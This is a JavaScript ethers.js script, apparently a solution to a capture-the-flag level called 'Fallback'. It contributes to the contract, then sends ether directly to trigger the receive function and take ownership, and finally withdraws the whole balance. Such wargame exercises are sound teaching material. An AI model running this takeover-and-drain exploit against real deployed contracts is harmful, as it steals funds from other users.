const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

async function main() {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create wallet
  let wallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Connect wallet
  let walletSigner = await wallet.connect(provider)
  // Create contract
  const contractAbi = fs.readFileSync('./Fallback.abi', 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    walletSigner
  )

  // Contribute ether via contract's 'contribute' function
  const contributionValue = ethers.utils.parseEther('0.0001')
  console.log(`Sending contract.contribute ${contributionValue.toString()}...`)
  const contractContribute = await contract.contribute({
    value: contributionValue,
  })
  await contractContribute.wait(1)

  // Confirm contribution via contract's 'getContribution' function
  console.log(
    'Current contribution:',
    (await contract.getContribution()).toString()
  )

  // Send ether to contract address ('receive' function)
  console.log(`Sending ${contributionValue.toString()} to contract address...`)
  const sentTxResponse = await walletSigner.sendTransaction({
    to: process.env.CONTRACT_ADDRESS,
    value: contributionValue,
    gasPrice: 20000000000,
  })
  await sentTxResponse.wait(1)

  // Check current contract owner
  const contractOwner = await contract.owner()
  console.log(`Contract owner is now: ${contractOwner}`)

  if (contractOwner === wallet.address) {
    console.log('Player is contract owner.')

    // Withdraw funds via contract's 'withdraw' function
    console.log('Withdrawing contract balance...')
    const contractWithDraw = await contract.withdraw()
    await contractWithDraw.wait(1)

    // Check new contract balance
    const balance = await provider.getBalance(process.env.CONTRACT_ADDRESS)
    console.log(`Contract balance is now: ${balance.toString()}`)
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
